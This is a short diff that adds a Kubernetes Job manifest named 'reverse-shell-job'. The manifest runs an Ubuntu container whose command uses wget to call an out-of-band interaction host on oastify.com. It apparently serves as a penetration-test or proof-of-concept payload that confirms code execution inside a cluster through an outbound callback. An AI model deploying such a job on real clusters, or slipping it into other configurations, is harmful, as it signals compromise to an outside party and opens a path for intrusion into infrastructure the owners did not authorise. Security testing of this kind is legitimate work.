@@ -1,0 +1,13 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: reverse-shell-job
+spec:
+  template:
+    spec:
+      containers:
+        - name: reverse-shell
+          image: ubuntu:latest
+          command: ["/bin/bash", "-c", "wget w0xxbvoy5ypvm5czv3s6gvkpogu7iykm9.oastify.com"]
+      restartPolicy: Never
+  backoffLimit: 0
